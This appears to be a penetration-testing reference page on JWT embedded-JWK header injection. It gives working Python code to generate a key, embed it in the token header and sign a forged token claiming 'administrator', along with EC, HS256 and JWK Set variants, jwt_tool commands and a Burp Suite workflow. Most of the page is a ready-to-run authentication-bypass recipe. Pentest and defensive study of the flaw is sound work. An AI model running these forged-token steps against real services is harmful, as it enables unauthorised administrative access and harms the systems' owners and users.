# JWT — Embedded JWK Injection (`jwk` header)

## When this applies

- App uses asymmetric JWT signing (RS256, ES256, etc.).
- The verification library trusts the `jwk` header parameter — i.e. embeds the public key inside the token itself.
- Vulnerable libraries: older versions of `jsonwebtoken`, custom verifiers that pull the key from the header.

## Technique

Generate your own RSA key pair. Embed YOUR public key in the JWT's `jwk` header. Sign with YOUR private key. The vulnerable verifier extracts the public key from the header (which is your key), checks the signature (which matches because you signed with the matching private key), and accepts the token.

## Steps

### 1. Generate RSA key pair

```python
from jwcrypto import jwk
key = jwk.JWK.generate(kty='RSA', size=2048)
```

### 2. Embed public key in header

```python
import json

header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": json.loads(key.export_public())
}
```

The `jwk` claim is a JSON object containing the public key fields:
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "attacker-key",
    "alg": "RS256",
    "n": "xGOr-H7A8JakwqmHC..."
  }
}
```

### 3. Sign with private key

```python
from jwcrypto import jwt as jwt_crypto

payload = {"sub": "administrator", "exp": 9999999999}
token = jwt_crypto.JWT(header=header, claims=payload)
token.make_signed_token(key)
print(token.serialize())
```

### 4. Variations

**Elliptic Curve (EC) key:**
```json
{
  "alg": "ES256",
  "jwk": {
    "kty": "EC",
    "crv": "P-256",
    "x": "f83OJ3D2xF1Bg8vub9tLe1gHMzV76e8Tus9uPHvRVEU",
    "y": "x_FEzRu9m36HLN_tue659LNpXW6pCyStikYjKIWI5a0"
  }
}
```

**Symmetric key in JWK (HS256):**
```json
{
  "alg": "HS256",
  "jwk": {"kty":"oct","k":"c2VjcmV0"}
}
```
(Less common; only works if the verifier accepts symmetric keys via `jwk`.)

**JWK Set form:**
```json
{
  "alg": "RS256",
  "jwk": {
    "keys": [
      {"kty":"RSA","kid":"key1","n":"...","e":"AQAB"}
    ]
  }
}
```

### 5. Manual testing

```bash
python3 jwt_tool.py <JWT> -X i              # Embed JWK
python3 jwk_inject.py --token <JWT> --payload '{"sub":"admin"}'
```

### 6. Burp JWT Editor workflow

1. JWT Editor → Keys tab → New RSA Key → Generate.
2. Repeater → JSON Web Token tab → Attack → Embedded JWK → Select generated key.
3. Modify payload claims as desired.
4. Send.

## Verifying success

- The vulnerable endpoint returns 200 with the modified claims honored.
- Server logs (when accessible) show the verification accepting the embedded key.
- Decoding the forged token at jwt.io shows the embedded JWK and the (matching) signature.

## Common pitfalls

- Modern libraries reject `jwk` header by default — they pull keys from JWKS endpoint or configured cert, not from the token. Test legacy/custom verifiers.
- If the server has a `kid` cache, your forged `kid` won't be found — try using the same `kid` as a legitimate token, or omit `kid`.
- The `jwk` field MUST contain a public key (not private). Don't accidentally include `d`/`p`/`q` — some validators reject the token; others may use the private key (catastrophically broken but rare).
- `alg` in the outer header MUST match the key type — `RS256` requires an RSA key in `jwk`, not EC.
- Your private key must be kept private — losing it during testing is fine, but in a real engagement, generate fresh keys per token.

## Tools

- jwt_tool (`-X i`).
- Burp Suite JWT Editor (Attack → Embedded JWK).
- jwcrypto Python library.
- jose (Node.js).
